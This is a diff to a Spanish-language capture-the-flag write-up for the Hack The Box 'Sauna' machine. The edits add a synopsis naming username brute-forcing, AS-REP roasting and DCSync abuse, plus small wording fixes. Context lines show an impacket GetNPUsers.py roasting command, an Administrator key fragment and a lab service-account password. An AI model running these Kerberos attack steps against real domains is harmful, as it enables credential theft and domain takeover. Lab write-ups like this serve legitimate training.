@@ -3,12 +3,16 @@
 
 <span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine.png)"</span>
 
-
+---
 <br/><br/>
 
 ## Sinopsis:
 
 La maquina Sauna es una pagina que contiene la informacion de un banco.En lo q respecta a pentesting web en la intruccion, tiene un nivel facil dado que en una de sus rutas deja a la vista a posibles nombres de usuario que forman parte del comite ejecutivo del banco. Se complica un poco la parte de la escalada de privilegios al tener q usar tecnologia de kerberos y base de datos para obtener el usuario Administrator del sistema.
+
+Para el usuario, usamos los nombres de usuario de fuerza bruta y luego usamos ASREP-Roasting para obterner el hash de uno.
+Para el roo, encontramos la contraseña de inicio d esesion para una cuenta que tiene privilegios DCSync.
+
 
 ## Habilidades aprendidas:
 
@@ -39,6 +43,8 @@ PING 10.10.10.175 (10.10.10.175) 56(124) bytes of data.
 rtt min/avg/max/mdev = 291.280/291.280/291.280/0.000 ms
 
 ```
+### ¿ Que son las TTL ?
+
 
 https://subinsb.com/default-device-ttl-values/
 
@@ -77,7 +83,7 @@ PORT      STATE SERVICE
 
 ```
 
-con este escanero simple de puertos al ver los servicios de puertos abiertos me llamaron la atencion los puertos 88, 389
+con este escaneo de puertos abiertos observe los siguientes servicios kerberos ldap  me llamaron la atencion los puertos 88, 389
 
 ```bash
 🧉
@@ -229,7 +235,8 @@ usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,
 🧉
 GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile fergus.txt -format john -outputfile hash.sauna
 
-```e
+```
+
 
 Obtengo el archivo hash.sauna
 
@@ -391,3 +398,5 @@ Administrator:des-cbc-md5:19d5f15d689b1ce5
 svc_loanmanager
 svc_loanmgr
 Moneymakestheworldgoround!
+
+
